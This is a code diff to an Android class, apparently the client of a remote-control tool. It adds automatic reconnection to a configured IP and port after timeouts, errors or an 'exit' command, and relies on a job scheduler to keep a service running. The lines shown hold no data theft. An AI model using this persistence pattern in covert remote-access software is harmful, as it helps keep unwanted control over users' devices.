@@ -76,6 +76,14 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
                 }catch (SocketTimeoutException | SocketException e){
                     Log.d(TAG,"error");
+                    activity.runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            new tcpConnection(activity,context).execute(config.IP,config.port);
+                        }
+                    });
+
+                    //new tcpConnection(activity,context).execute(config.IP,config.port);
                 }
                 if(socket.isConnected()){
                     Log.d(TAG,"done");
@@ -94,6 +102,12 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 if (line.equals("exit"))
                 {
                     Log.d("service_runner","called");
+                    activity.runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            new tcpConnection(activity,context).execute(config.IP,config.port);
+                        }
+                    });
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                         functions.jobScheduler(context);
                     }else{
@@ -254,6 +268,12 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             }
         } catch (Exception e) {
             Log.d("service_runner","called");
+            activity.runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    new tcpConnection(activity,context).execute(config.IP,config.port);
+                }
+            });
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 functions.jobScheduler(context);
             }else{
